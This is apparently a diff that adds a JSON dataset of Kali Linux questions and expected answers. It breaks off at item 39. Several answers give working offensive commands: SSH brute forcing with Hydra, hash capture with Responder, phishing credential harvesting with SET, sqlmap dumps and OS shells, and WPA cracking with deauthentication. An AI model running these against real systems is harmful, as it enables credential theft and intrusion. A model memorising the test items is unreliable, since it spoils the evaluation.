@@ -1,0 +1,402 @@
+[
+  {
+    "id": 1,
+    "prompt": "In an authorized lab, which Kali Linux tool would you use to scan open ports on a target machine?",
+    "expected_answer": "Nmap is the primary network scanning tool in Kali Linux used for port discovery and network reconnaissance. You can run a basic scan with `nmap <target_ip>` which scans the top 1000 TCP ports by default. For a comprehensive scan of all 65535 ports, use `nmap -p- <target_ip>`. The output displays each discovered port with its state (open, closed, filtered) and the associated service name. In penetration testing, Nmap is typically the first tool used during the reconnaissance phase to map the attack surface of a target system.",
+    "reasoning_requirement": "Identify the primary network scanning tool included in Kali.",
+    "evaluation_criteria": "Correctly names Nmap as standard port scanner.",
+    "category": "kali_tools"
+  },
+  {
+    "id": 2,
+    "prompt": "What Nmap flag enables service version detection during a scan?",
+    "expected_answer": "The `-sV` flag enables service version detection in Nmap, which probes open ports to determine the running service and its version number. For example, `nmap -sV 192.168.1.1` will not only show port 80 as open but identify it as running Apache 2.4.41. This works by sending protocol-specific probes and matching responses against Nmap's nmap-service-probes database. The intensity can be adjusted from 0-9 using `--version-intensity`; higher values send more probes but take longer. In penetration testing, version detection is critical for identifying vulnerable software versions that can be cross-referenced with CVE databases.",
+    "reasoning_requirement": "Recall Nmap scanning options for service enumeration.",
+    "evaluation_criteria": "Specifies correct flag for version detection.",
+    "category": "kali_tools"
+  },
+  {
+    "id": 3,
+    "prompt": "You want to perform a SYN scan in a lab. Which Nmap option is appropriate?",
+    "expected_answer": "The `-sS` flag performs a SYN scan (also called half-open or stealth scan) in Nmap, executed via `nmap -sS <target>`. This scan sends a SYN packet to each port and waits for a SYN-ACK (open) or RST (closed) response, but never completes the TCP three-way handshake. Because the connection is never fully established, it is faster and less likely to be logged by basic application-level logging. A SYN scan requires root/sudo privileges since it crafts raw packets. It is the default scan type when Nmap is run with root privileges, and is widely used in penetration testing for initial port discovery due to its speed and relative stealth.",
+    "reasoning_requirement": "Match scan type to Nmap flag.",
+    "evaluation_criteria": "Correctly identifies SYN scan option.",
+    "category": "kali_tools"
+  },
+  {
+    "id": 4,
+    "prompt": "Which Kali tool is commonly used for web application interception and request manipulation?",
+    "expected_answer": "Burp Suite is the primary web application interception proxy bundled with Kali Linux, used for intercepting, inspecting, and modifying HTTP/HTTPS traffic between a browser and web server. It operates by configuring the browser to route traffic through its proxy (default localhost:8080), allowing testers to capture every request and response in real time. Key features include the Repeater for manually replaying modified requests, Intruder for automated parameter fuzzing, and Scanner (Pro edition) for automated vulnerability detection. In penetration testing, Burp Suite is essential for testing authentication bypass, parameter tampering, session management flaws, and injection vulnerabilities.",
+    "reasoning_requirement": "Identify web proxy tool bundled in Kali.",
+    "evaluation_criteria": "Names Burp Suite as interception proxy.",
+    "category": "kali_tools"
+  },
+  {
+    "id": 5,
+    "prompt": "In Kali Linux, which tool is used for password hash cracking in offline testing?",
+    "expected_answer": "John the Ripper is the go-to offline password hash cracking tool in Kali Linux, supporting over 200 hash formats including MD5, SHA-256, bcrypt, and NTLM. Basic usage is `john --wordlist=/usr/share/wordlists/rockyou.txt hashfile.txt` which runs a dictionary attack against the extracted hashes. John supports multiple attack modes: wordlist mode, incremental (brute force) mode, and rule-based mangling which applies transformations like appending numbers or toggling case. You can check cracked results with `john --show hashfile.txt`. In penetration testing, hashes are typically extracted from /etc/shadow, SAM databases, or database dumps, then cracked offline to demonstrate credential weakness without triggering account lockouts.",
+    "reasoning_requirement": "Identify hash cracking tool.",
+    "evaluation_criteria": "Correctly identifies John the Ripper.",
+    "category": "kali_tools"
+  },
+  {
+    "id": 6,
+    "prompt": "Which command updates Kali Linux package repositories?",
+    "expected_answer": "The command `sudo apt update` synchronizes the local package index with the remote Kali Linux repositories, downloading the latest list of available packages and their versions. This does not install or upgrade any packages—it only refreshes the metadata. To actually upgrade installed packages after updating, you would run `sudo apt upgrade` or `sudo apt full-upgrade` for a more aggressive upgrade that handles dependency changes. It is best practice to run `sudo apt update && sudo apt upgrade -y` before any penetration test to ensure all tools are at their latest versions with current vulnerability databases. The repository sources are configured in `/etc/apt/sources.list` and should point to the official Kali mirrors.",
+    "reasoning_requirement": "Recall Debian-based package management.",
+    "evaluation_criteria": "Uses correct apt update command.",
+    "category": "kali_tools"
+  },
+  {
+    "id": 7,
+    "prompt": "Which tool in Kali is commonly used for directory brute forcing on web servers?",
+    "expected_answer": "Gobuster is a fast directory and file brute-forcing tool written in Go, commonly used in Kali for web content discovery. The basic command is `gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt` which enumerates hidden directories and files by testing each wordlist entry against the web server. Key flags include `-x` to specify file extensions (e.g., `-x php,html,txt`), `-t` to set the number of concurrent threads, and `-s` to filter by HTTP status codes. Gobuster also supports DNS subdomain enumeration mode with `gobuster dns` and virtual host discovery with `gobuster vhost`. In penetration testing, directory brute-forcing often reveals admin panels, backup files, configuration files, and other sensitive resources not linked from the main application.",
+    "reasoning_requirement": "Match tool to web directory enumeration task.",
+    "evaluation_criteria": "Identifies Gobuster (Dirb/ffuf acceptable if justified).",
+    "category": "kali_tools"
+  },
+  {
+    "id": 8,
+    "prompt": "What tool is used in Kali for wireless network auditing in monitor mode?",
+    "expected_answer": "The Aircrack-ng suite is the primary wireless network auditing toolkit in Kali Linux, consisting of multiple tools for different phases of wireless testing. The suite includes `airmon-ng` for enabling monitor mode on wireless interfaces, `airodump-ng` for capturing wireless packets and identifying nearby access points, `aireplay-ng` for injecting packets and performing deauthentication attacks, and `aircrack-ng` for cracking WEP/WPA keys from captured handshakes. A typical workflow starts with `airmon-ng start wlan0` to enter monitor mode, then `airodump-ng wlan0mon` to discover networks. In authorized penetration testing, this suite is used to assess wireless network security, test encryption strength, and verify that rogue access point detection systems are functioning properly.",
+    "reasoning_requirement": "Identify wireless auditing toolkit.",
+    "evaluation_criteria": "Names Aircrack-ng or specific component like airodump-ng.",
+    "category": "kali_tools"
+  },
+  {
+    "id": 9,
+    "prompt": "Which command enables monitor mode on a wireless interface using airmon-ng?",
+    "expected_answer": "The command `airmon-ng start wlan0` enables monitor mode on the wireless interface wlan0, creating a new monitor-mode interface typically named `wlan0mon`. Before running this command, you should first kill interfering processes with `airmon-ng check kill` to stop NetworkManager and wpa_supplicant from disrupting packet capture. Monitor mode allows the wireless adapter to capture all wireless frames in the vicinity, not just those addressed to it, which is essential for wireless auditing. You can verify the mode change with `iwconfig wlan0mon` which should show 'Mode:Monitor'. To return the interface to managed mode after testing, use `airmon-ng stop wlan0mon`. This is always the first step in any wireless penetration testing engagement using the Aircrack-ng suite.",
+    "reasoning_requirement": "Recall monitor mode activation syntax.",
+    "evaluation_criteria": "Correct command structure with interface.",
+    "category": "kali_tools"
+  },
+  {
+    "id": 10,
+    "prompt": "Which Kali tool helps automate SQL injection testing in authorized environments?",
+    "expected_answer": "sqlmap is the premier automated SQL injection detection and exploitation tool in Kali Linux. Basic usage is `sqlmap -u 'http://target.com/page?id=1'` which tests the `id` parameter for various SQL injection types including boolean-based blind, time-based blind, error-based, UNION query, and stacked queries. Key flags include `--dbs` to enumerate databases, `--tables -D dbname` to list tables, `--dump -T tablename` to extract data, and `--os-shell` to attempt operating system command execution. sqlmap automatically detects the backend DBMS (MySQL, PostgreSQL, MSSQL, Oracle, etc.) and adjusts its payloads accordingly. In penetration testing, sqlmap is used after manually confirming a potential injection point, and its `--level` and `--risk` parameters control testing thoroughness.",
+    "reasoning_requirement": "Match tool to SQL injection testing.",
+    "evaluation_criteria": "Correctly identifies sqlmap.",
+    "category": "kali_tools"
+  },
+  {
+    "id": 11,
+    "prompt": "What command checks your current IP configuration in Kali?",
+    "expected_answer": "The command `ip a` (short for `ip addr show`) displays all network interfaces and their IP configurations on a Kali Linux system. The output shows each interface (lo, eth0, wlan0, etc.) along with its IPv4 and IPv6 addresses, subnet masks in CIDR notation, MAC addresses, and interface state (UP/DOWN). The older `ifconfig` command provides similar information but is deprecated in favor of the `ip` command from the iproute2 package. For more targeted output, `ip -4 a` shows only IPv4 addresses, and `ip a show eth0` filters to a specific interface. In penetration testing, checking your IP configuration is essential for verifying VPN connectivity, confirming you are on the correct network segment, and identifying which interface to use for scans.",
+    "reasoning_requirement": "Recall Linux networking command.",
+    "evaluation_criteria": "Identifies 'ip a' or 'ifconfig'.",
+    "category": "kali_tools"
+  },
+  {
+    "id": 12,
+    "prompt": "Which Kali tool is used for vulnerability scanning of networks?",
+    "expected_answer": "OpenVAS (now part of the Greenbone Vulnerability Management suite) is the primary open-source vulnerability scanner available in Kali Linux. It maintains a database of over 50,000 Network Vulnerability Tests (NVTs) that check for known CVEs, misconfigurations, and security weaknesses across network services. Setup requires running `gvm-setup` to initialize the databases and create an admin account, then accessing the web interface at https://localhost:9392. Scans can be configured with different scan configs ranging from quick discovery to full and deep testing. The scan results include severity ratings (CVSS scores), affected hosts, detailed vulnerability descriptions, and remediation recommendations. In penetration testing, OpenVAS is used during the vulnerability assessment phase to systematically identify exploitable weaknesses before manual exploitation.",
+    "reasoning_requirement": "Identify vulnerability scanner in Kali.",
+    "evaluation_criteria": "Correctly names OpenVAS/Greenbone.",
+    "category": "kali_tools"
+  },
+  {
+    "id": 13,
+    "prompt": "Which tool is commonly used for subdomain enumeration in Kali?",
+    "expected_answer": "Amass is a powerful subdomain enumeration and network mapping tool in Kali Linux developed by the OWASP project. Running `amass enum -d target.com` performs passive and active enumeration by querying DNS, scraping certificate transparency logs, searching web archives, and leveraging various API data sources. The `-passive` flag limits to non-intrusive data gathering, while `-active` includes DNS zone transfers and brute forcing. Amass can output results in multiple formats including JSON with `amass enum -d target.com -json output.json` for integration with other tools. In penetration testing and bug bounty hunting, subdomain enumeration is a critical early reconnaissance step that often reveals forgotten staging servers, admin portals, and legacy applications with weaker security controls.",
+    "reasoning_requirement": "Match tool to reconnaissance task.",
+    "evaluation_criteria": "Identifies Amass (Subfinder acceptable).",
+    "category": "kali_tools"
+  },
+  {
+    "id": 14,
+    "prompt": "What command displays running processes in Kali?",
+    "expected_answer": "The command `ps aux` displays a snapshot of all currently running processes on the Kali Linux system. The flags break down as: `a` shows processes from all users, `u` displays the process owner with CPU/memory usage in a user-friendly format, and `x` includes processes not attached to a terminal. The output columns include USER, PID, %CPU, %MEM, VSZ, RSS, TTY, STAT, START, TIME, and COMMAND. For real-time monitoring, `htop` provides an interactive view with sorting and filtering capabilities. In penetration testing, reviewing running processes is essential for post-exploitation situational awareness—identifying running services, detecting security tools like antivirus or EDR, and finding processes that might be leveraged for privilege escalation.",
+    "reasoning_requirement": "Recall Linux process listing command.",
+    "evaluation_criteria": "Correct syntax for process listing.",
+    "category": "kali_tools"
+  },
+  {
+    "id": 15,
+    "prompt": "Which tool in Kali is used for packet capture and network analysis?",
+    "expected_answer": "Wireshark is the leading graphical network protocol analyzer in Kali Linux, capable of capturing and inspecting live network traffic at a granular level. It captures packets on any interface using `wireshark` or its CLI counterpart `tshark -i eth0 -w capture.pcap`. Display filters like `http.request`, `tcp.port == 443`, or `ip.addr == 192.168.1.1` allow focused analysis of specific traffic patterns. Wireshark decodes hundreds of protocols and can follow TCP streams to reconstruct full conversations, extract transferred files, and identify credentials sent in cleartext. In penetration testing, Wireshark is invaluable for analyzing captured traffic during man-in-the-middle tests, verifying exploit payloads, debugging network-level issues, and documenting evidence of insecure protocol usage.",
+    "reasoning_requirement": "Identify packet analyzer.",
+    "evaluation_criteria": "Names Wireshark or tcpdump.",
+    "category": "kali_tools"
+  },
+  {
+    "id": 16,
+    "prompt": "What is the purpose of Metasploit Framework in Kali?",
+    "expected_answer": "Metasploit Framework is the most widely used open-source exploitation framework in Kali Linux, designed for developing, testing, and executing exploits against target systems in authorized penetration testing engagements. It provides a database of over 2,000 exploits, 1,000+ auxiliary modules for scanning and enumeration, and hundreds of payloads including the powerful Meterpreter shell. The framework is launched with `msfconsole` and follows a workflow of selecting an exploit module with `use`, setting target parameters with `set RHOSTS`, choosing a payload, and executing with `run` or `exploit`. Metasploit also integrates with Nmap scan results via `db_nmap` and can import vulnerability scan data to streamline the exploitation phase.",
+    "reasoning_requirement": "Explain high-level purpose.",
+    "evaluation_criteria": "Describes exploitation/testing framework responsibly.",
+    "category": "kali_tools"
+  },
+  {
+    "id": 17,
+    "prompt": "Which command checks open listening ports locally?",
+    "expected_answer": "The command `netstat -tulnp` displays all open listening ports on the local Kali Linux system. The flags are: `-t` for TCP, `-u` for UDP, `-l` for listening sockets only, `-n` for numeric addresses (skip DNS resolution), and `-p` to show the process ID and name owning each socket. The modern replacement is `ss -tulnp` which is faster and provides the same information from the kernel's socket statistics. The output columns show the protocol, local address:port, and the process responsible for each listening service. In penetration testing, checking listening ports on a compromised host reveals running services, identifies potential pivot points, and helps map internal network services that are not externally accessible.",
+    "reasoning_requirement": "Recall port inspection command.",
+    "evaluation_criteria": "Correct command or 'ss -tulnp' alternative.",
+    "category": "kali_tools"
+  },
+  {
+    "id": 18,
+    "prompt": "What tool helps enumerate SMB shares in a lab environment?",
+    "expected_answer": "smbclient and enum4linux are the primary tools in Kali Linux for enumerating SMB shares and gathering information from Windows systems. The command `smbclient -L //target_ip -N` lists available shares using a null session (no authentication), while `enum4linux -a target_ip` performs comprehensive enumeration including users, groups, shares, password policies, and OS information. For more targeted enumeration, `smbmap -H target_ip` shows share permissions and allows file listing. The Nmap NSE script `nmap --script smb-enum-shares target_ip` provides another enumeration method. In penetration testing, SMB enumeration often reveals misconfigured shares with sensitive data, null session access that leaks domain information, and writable shares that can be used for lateral movement.",
+    "reasoning_requirement": "Match SMB enumeration tools.",
+    "evaluation_criteria": "Identifies valid SMB enumeration tool.",
+    "category": "kali_tools"
+  },
+  {
+    "id": 19,
+    "prompt": "Which Kali tool is used for brute force login testing over SSH in labs?",
+    "expected_answer": "Hydra (THC-Hydra) is the most commonly used online brute force tool in Kali Linux for testing SSH and many other protocols. The basic SSH brute force command is `hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://target_ip` which tests the username 'admin' against the rockyou wordlist. Key flags include `-L` for a username list, `-P` for a password list, `-t` to set parallel connections (default 16), `-V` for verbose output showing each attempt, and `-f` to stop after the first valid credential is found. Hydra supports over 50 protocols including FTP, HTTP, MySQL, RDP, SMB, and SMTP. In penetration testing, Hydra is used to demonstrate weak credential policies, but testers must be cautious of account lockout thresholds that could cause denial of service.",
+    "reasoning_requirement": "Identify credential testing tool.",
+    "evaluation_criteria": "Correctly names Hydra.",
+    "category": "kali_tools"
+  },
+  {
+    "id": 20,
+    "prompt": "What command changes file permissions in Linux?",
+    "expected_answer": "The `chmod` command changes file and directory permissions in Linux, supporting both symbolic and numeric (octal) notation. Symbolic usage like `chmod u+x script.sh` adds execute permission for the owner, while numeric usage like `chmod 755 script.sh` sets owner read/write/execute (7), group read/execute (5), and others read/execute (5). The `-R` flag applies permissions recursively to directories and their contents. Each octal digit represents a sum of read (4), write (2), and execute (1) permissions. In penetration testing, chmod is frequently used to make downloaded exploit scripts executable with `chmod +x exploit.sh`, and reviewing file permissions with `ls -la` is a key step in privilege escalation—finding world-writable files, SUID binaries, or misconfigured cron scripts.",
+    "reasoning_requirement": "Recall file permission command.",
+    "evaluation_criteria": "Identifies chmod.",
+    "category": "kali_tools"
+  },
+  {
+    "id": 21,
+    "prompt": "Which tool is used for DNS enumeration in Kali?",
+    "expected_answer": "dnsenum is a dedicated DNS enumeration tool in Kali Linux that automates the discovery of DNS records, subdomains, and related network information. Running `dnsenum target.com` performs host address lookups, nameserver identification, MX record retrieval, zone transfer attempts with `axfr`, and Google scraping for additional subdomains. For more targeted queries, `dig` is the standard DNS lookup utility—`dig target.com ANY` retrieves all record types, while `dig @ns1.target.com target.com axfr` attempts a zone transfer against a specific nameserver. The tool `dnsrecon` provides similar functionality with `dnsrecon -d target.com -t std`. In penetration testing, successful DNS enumeration can reveal internal hostnames, mail servers, SPF records indicating email infrastructure, and occasionally full zone transfers that expose the entire DNS namespace.",
+    "reasoning_requirement": "Match tool to DNS recon.",
+    "evaluation_criteria": "Correctly identifies dnsenum (or dig if explained).",
+    "category": "kali_tools"
+  },
+  {
+    "id": 22,
+    "prompt": "What does the Nmap -A flag enable?",
+    "expected_answer": "The Nmap `-A` flag enables aggressive scanning, which combines multiple detection features into a single option: OS detection (`-O`), service version detection (`-sV`), default NSE script scanning (`-sC`), and traceroute (`--traceroute`). Running `nmap -A target_ip` provides comprehensive information about each open port including the exact service version, operating system fingerprint with confidence percentage, and network path to the target. The NSE scripts executed by `-sC` include checks for common vulnerabilities, default credentials, and service-specific information gathering. While extremely informative, the aggressive scan is noisier and slower than targeted scans, making it more suitable for lab environments than stealthy engagements. In penetration testing, `-A` is often used during the initial deep-dive phase after a quick port discovery scan.",
+    "reasoning_requirement": "Recall advanced scan option.",
+    "evaluation_criteria": "Mentions multiple detection features.",
+    "category": "kali_tools"
+  },
+  {
+    "id": 23,
+    "prompt": "Which tool helps fuzz web parameters in Kali?",
+    "expected_answer": "ffuf (Fuzz Faster U Fool) is a high-speed web fuzzer written in Go, widely used in Kali Linux for discovering hidden content, parameters, and virtual hosts. Basic directory fuzzing is performed with `ffuf -u http://target.com/FUZZ -w /usr/share/wordlists/dirb/common.txt` where FUZZ is replaced by each wordlist entry. Parameter fuzzing uses `ffuf -u 'http://target.com/page?FUZZ=value' -w params.txt` to discover hidden GET parameters. Key flags include `-fc` to filter by HTTP status code, `-fs` to filter by response size, `-mc` to match specific codes, and `-t` to set threads. In penetration testing, ffuf excels at discovering hidden API endpoints, testing for IDOR vulnerabilities by fuzzing numeric IDs, and identifying valid usernames through response size differences in login forms.",
+    "reasoning_requirement": "Match fuzzing tool to web testing.",
+    "evaluation_criteria": "Identifies ffuf or wfuzz.",
+    "category": "kali_tools"
+  },
+  {
+    "id": 24,
+    "prompt": "What command shows current working directory?",
+    "expected_answer": "The `pwd` command (print working directory) outputs the absolute path of the current directory you are working in on the Linux filesystem. Running `pwd` might output something like `/home/kali/Desktop/pentest-project`, helping you orient yourself in the directory structure. The `-L` flag shows the logical path (following symlinks) while `-P` shows the physical path (resolving symlinks). This is one of the most fundamental Linux navigation commands, often used alongside `ls` to list contents and `cd` to change directories. In penetration testing, knowing your exact working directory is important when setting up tool output paths, referencing wordlists, saving scan results, and ensuring exploit scripts reference correct relative file paths.",
+    "reasoning_requirement": "Recall Linux navigation basics.",
+    "evaluation_criteria": "Correct command.",
+    "category": "kali_tools"
+  },
+  {
+    "id": 25,
+    "prompt": "Which Kali tool can capture credentials from network traffic in lab simulations?",
+    "expected_answer": "Responder is a powerful LLMNR, NBT-NS, and MDNS poisoning tool in Kali Linux used to capture credentials on local network segments during authorized testing. Running `sudo responder -I eth0 -wrf` starts listening for name resolution broadcasts and responds with the attacker's IP, causing victims to send their NTLMv2 hashes when attempting to authenticate. Captured hashes are displayed in real-time and saved to log files in `/usr/share/responder/logs/` for offline cracking with Hashcat or John the Ripper. Responder also includes built-in rogue servers for HTTP, SMB, MSSQL, FTP, LDAP, and other protocols. In penetration testing, Responder is one of the most effective tools for capturing domain credentials on Windows networks, especially in environments where LLMNR and NBT-NS are not disabled.",
+    "reasoning_requirement": "Match tool to LLMNR/NBT-NS testing.",
+    "evaluation_criteria": "Identifies Responder in authorized context.",
+    "category": "kali_tools"
+  },
+  {
+    "id": 26,
+    "prompt": "What command lists files in a directory?",
+    "expected_answer": "The `ls` command lists files and directories in the current or specified directory on Linux systems. The most commonly used variant is `ls -la` which combines `-l` for long format (showing permissions, owner, group, size, and modification date) with `-a` to include hidden files (those starting with a dot). Other useful flags include `-lh` for human-readable file sizes, `-ltr` for sorting by modification time in reverse (newest last), and `-R` for recursive listing of subdirectories. In penetration testing, `ls -la` is critical for post-exploitation enumeration—identifying SUID binaries with `find / -perm -4000 2>/dev/null`, checking file permissions for privilege escalation vectors, and discovering hidden configuration files containing credentials or sensitive data.",
+    "reasoning_requirement": "Basic Linux command recall.",
+    "evaluation_criteria": "Correct command.",
+    "category": "kali_tools"
+  },
+  {
+    "id": 27,
+    "prompt": "Which tool is used for reverse engineering binaries in Kali?",
+    "expected_answer": "Ghidra is a free, open-source reverse engineering framework developed by the NSA, included in Kali Linux for analyzing compiled binaries and malware. It provides a powerful disassembler and decompiler that converts machine code back into readable C-like pseudocode, making it significantly easier to understand program logic. Launch it with `ghidraRun` and import a binary to see the decompiled output alongside the assembly view, cross-references, function graphs, and string analysis. Ghidra supports multiple architectures including x86, x64, ARM, MIPS, and PowerPC. In penetration testing, Ghidra is used to analyze custom binaries for vulnerabilities like buffer overflows, reverse engineer proprietary protocols, understand malware behavior, and identify hard-coded credentials or encryption keys embedded in applications.",
+    "reasoning_requirement": "Identify reverse engineering tool.",
+    "evaluation_criteria": "Names Ghidra or Radare2.",
+    "category": "kali_tools"
+  },
+  {
+    "id": 28,
+    "prompt": "What file contains hashed user passwords in modern Linux systems?",
+    "expected_answer": "The file `/etc/shadow` stores hashed user passwords on modern Linux systems including Kali, readable only by root (permissions 640). Each line follows the format `username:$hashtype$salt$hash:last_changed:min:max:warn:inactive:expire` where the hash type identifier indicates the algorithm—$1$ for MD5, $5$ for SHA-256, $6$ for SHA-512, and $y$ for yescrypt. The older `/etc/passwd` file is world-readable but no longer contains actual password hashes (replaced with 'x'). In penetration testing, obtaining `/etc/shadow` after gaining root access allows offline password cracking with `john --wordlist=rockyou.txt shadow.txt` or `hashcat -m 1800 shadow.txt wordlist.txt`. The `unshadow` utility from John the Ripper combines `/etc/passwd` and `/etc/shadow` into a single crackable format.",
+    "reasoning_requirement": "Recall Linux authentication files.",
+    "evaluation_criteria": "Correct system file identified.",
+    "category": "kali_tools"
+  },
+  {
+    "id": 29,
+    "prompt": "Which Kali tool assists in creating phishing simulation pages for training?",
+    "expected_answer": "The Social Engineering Toolkit (SET) is an open-source penetration testing framework in Kali Linux specifically designed for social engineering attack simulations. Launch it with `sudo setoolkit` which presents a menu-driven interface; selecting 'Website Attack Vectors' then 'Credential Harvester Attack Method' then 'Site Cloner' allows you to clone any login page and host it locally to capture submitted credentials. SET can also generate phishing emails, create malicious payloads disguised as legitimate files, and perform SMS spoofing simulations. The credential harvester listens on port 80 and logs all captured form submissions to the terminal and a report file. In authorized security awareness training, SET demonstrates how convincing phishing attacks can be, helping organizations justify investment in employee security training programs.",
+    "reasoning_requirement": "Identify social engineering testing tool.",
+    "evaluation_criteria": "Names SET in training/lab context.",
+    "category": "kali_tools"
+  },
+  {
+    "id": 30,
+    "prompt": "What command is used to search for files by name in Linux?",
+    "expected_answer": "The `find` command searches for files and directories based on name, type, size, permissions, and modification time across the Linux filesystem. Basic name search syntax is `find /path -name 'filename.txt'` for exact matches or `find / -name '*.conf'` for wildcard pattern matching. The `-iname` flag provides case-insensitive matching, `-type f` restricts to files only, `-type d` to directories, and `-size +1M` finds files larger than 1 megabyte. The `-exec` flag allows executing commands on results, such as `find / -perm -4000 -exec ls -la {} \\;` to list all SUID binaries. In penetration testing, the find command is essential for post-exploitation privilege escalation—searching for SUID/SGID binaries, world-writable directories, configuration files with passwords, SSH keys, and files owned by specific users.",
+    "reasoning_requirement": "Recall file search command.",
+    "evaluation_criteria": "Correct command usage.",
+    "category": "kali_tools"
+  },
+  {
+    "id": 31,
+    "prompt": "Which tool helps exploit misconfigured FTP services in a lab?",
+    "expected_answer": "Metasploit Framework and the standard ftp client are the primary tools in Kali for testing misconfigured FTP services. First, check for anonymous login with `ftp target_ip` and entering 'anonymous' as username with any email as password. Metasploit provides modules like `auxiliary/scanner/ftp/anonymous` to scan for anonymous FTP access and `auxiliary/scanner/ftp/ftp_version` to identify the FTP server version for known exploits. Nmap scripts like `nmap --script ftp-anon,ftp-bounce,ftp-vuln* target_ip` automate FTP vulnerability checks. In penetration testing, misconfigured FTP services commonly expose sensitive files through anonymous read access, allow file upload to web-accessible directories enabling webshell deployment, and sometimes run outdated versions vulnerable to remote code execution exploits like vsFTPd 2.3.4 backdoor.",
+    "reasoning_requirement": "Identify testing approach responsibly.",
+    "evaluation_criteria": "Mentions exploitation framework or enumeration first.",
+    "category": "kali_tools"
+  },
+  {
+    "id": 32,
+    "prompt": "What does chmod 755 mean?",
+    "expected_answer": "The permission `chmod 755` sets the file to owner read/write/execute (7), group read/execute (5), and others read/execute (5) using octal notation where each digit is a sum of read=4, write=2, execute=1. Broken down: the owner (7=4+2+1) can read, write, and execute the file; the group (5=4+1) can read and execute but not modify; and all other users (5=4+1) also get read and execute permissions. This permission set is commonly applied to executable scripts and program files that need to be run by multiple users. The equivalent symbolic notation would be `chmod u=rwx,go=rx filename`. In penetration testing, understanding file permissions is crucial—misconfigured permissions like 777 (world-writable) on scripts executed by root or cron jobs represent a direct privilege escalation vector where an attacker can inject malicious code.",
+    "reasoning_requirement": "Interpret numeric file permissions.",
+    "evaluation_criteria": "Correct permission breakdown.",
+    "category": "kali_tools"
+  },
+  {
+    "id": 33,
+    "prompt": "Which Kali tool is used for OSINT investigations?",
+    "expected_answer": "Maltego is the primary open-source intelligence (OSINT) and graphical link analysis tool included in Kali Linux, used for mapping relationships between people, organizations, domains, IP addresses, and online infrastructure. It uses 'transforms' to automatically query public data sources and visualize connections in an interactive graph—for example, starting from a domain name, it can discover associated email addresses, DNS records, WHOIS data, social media profiles, and related infrastructure. Maltego Community Edition is free and pre-installed in Kali, while the commercial version offers additional transforms and data sources. Other OSINT tools in Kali include theHarvester for email/subdomain gathering and Recon-ng for automated reconnaissance. In penetration testing, OSINT is the passive reconnaissance phase that maps the target's digital footprint before any active scanning begins.",
+    "reasoning_requirement": "Match tool to OSINT analysis.",
+    "evaluation_criteria": "Identifies Maltego.",
+    "category": "kali_tools"
+  },
+  {
+    "id": 34,
+    "prompt": "What command switches to root user in Kali?",
+    "expected_answer": "The command `sudo -i` switches to an interactive root shell in Kali Linux, providing a full root login environment with root's PATH and home directory (/root). Alternatively, `sudo su -` achieves the same result by invoking the substitute user command. The simpler `sudo su` gives a root shell but retains the current user's environment variables. For executing a single command as root without switching shells, use `sudo <command>`. In modern Kali Linux (2020.1+), the default user is 'kali' instead of the historical root user, requiring sudo for privileged operations. In penetration testing, many tools like Nmap SYN scans, Responder, and raw packet manipulation require root privileges, so understanding privilege escalation from standard user to root is essential for both using Kali effectively and testing target systems.",
+    "reasoning_requirement": "Recall privilege escalation command.",
+    "evaluation_criteria": "Correct usage of sudo.",
+    "category": "kali_tools"
+  },
+  {
+    "id": 35,
+    "prompt": "Which tool performs automated web vulnerability scanning?",
+    "expected_answer": "Nikto is an open-source web server scanner in Kali Linux that performs comprehensive automated vulnerability assessments against web servers. Running `nikto -h http://target.com` scans for over 6,700 potentially dangerous files, outdated server software, version-specific vulnerabilities, and server configuration issues like directory indexing and HTTP method exposure. Key flags include `-p` to specify a non-standard port, `-ssl` to force HTTPS scanning, `-Tuning` to select specific test categories, and `-output report.html -Format html` for HTML report generation. Nikto checks for default installations, known vulnerable CGI scripts, missing security headers, and information disclosure issues. In penetration testing, Nikto provides a quick initial assessment of web server security posture, though its scans are noisy and easily detected by WAFs—making it more suitable for authorized testing rather than stealthy reconnaissance.",
+    "reasoning_requirement": "Identify web scanner.",
+    "evaluation_criteria": "Names Nikto.",
+    "category": "kali_tools"
+  },
+  {
+    "id": 36,
+    "prompt": "What command displays disk usage?",
+    "expected_answer": "The command `df -h` displays filesystem disk usage with human-readable sizes (KB, MB, GB) on Linux systems including Kali. The output shows each mounted filesystem with its total size, used space, available space, usage percentage, and mount point. The `-h` flag converts raw byte counts into readable units, while `-T` adds the filesystem type column. For directory-level disk usage, `du -sh /path` shows the total size of a specific directory, and `du -sh * | sort -rh` lists items in the current directory sorted by size. In penetration testing, checking disk usage is important for ensuring sufficient space for tool output, scan results, and packet captures—a full disk can cause tools to fail silently. On compromised targets, `df -h` helps identify additional mounted drives or network shares that may contain sensitive data.",
+    "reasoning_requirement": "Recall disk inspection command.",
+    "evaluation_criteria": "Correct flag for human-readable output.",
+    "category": "kali_tools"
+  },
+  {
+    "id": 37,
+    "prompt": "Which tool helps crack WPA handshakes in lab exercises?",
+    "expected_answer": "Aircrack-ng is the tool used to crack WPA/WPA2 handshakes captured during wireless penetration testing in Kali Linux. The cracking command is `aircrack-ng -w /usr/share/wordlists/rockyou.txt -b <BSSID> capture.cap` which performs a dictionary attack against the captured four-way handshake. The handshake must first be captured using `airodump-ng -c <channel> --bssid <AP_MAC> -w capture wlan0mon` while simultaneously deauthenticating a client with `aireplay-ng -0 5 -a <AP_MAC> wlan0mon` to force a reconnection. For faster cracking, the capture can be converted to hashcat format with `aircrack-ng capture.cap -J output` and then cracked on GPU with Hashcat using mode 2500. In lab environments, this workflow demonstrates why strong, unique WiFi passwords are essential since short or dictionary-based WPA keys can be cracked in minutes.",
+    "reasoning_requirement": "Identify wireless testing tool.",
+    "evaluation_criteria": "Correct tool identification.",
+    "category": "kali_tools"
+  },
+  {
+    "id": 38,
+    "prompt": "What does the 'top' command do?",
+    "expected_answer": "The `top` command provides a real-time, dynamic view of running processes and system resource utilization on Linux systems including Kali. It displays continuously updating information including CPU usage per core, total and available memory/swap, load averages, and a sortable process list showing PID, user, CPU%, memory%, process state, and command name. Interactive keys within top include `P` to sort by CPU usage, `M` to sort by memory, `k` to kill a process by PID, `q` to quit, and `1` to toggle per-CPU statistics. The enhanced alternative `htop` provides a more user-friendly interface with color-coded bars, mouse support, and easier process management. In penetration testing, top is used for monitoring resource-intensive scans to prevent system overload, identifying suspicious processes on compromised hosts, and detecting CPU-intensive operations like cryptocurrency miners during incident response.",
+    "reasoning_requirement": "Explain system monitoring command.",
+    "evaluation_criteria": "Correct explanation.",
+    "category": "kali_tools"
+  },
+  {
+    "id": 39,
+    "prompt": "Which Kali tool can enumerate HTTP technologies used by a website?",
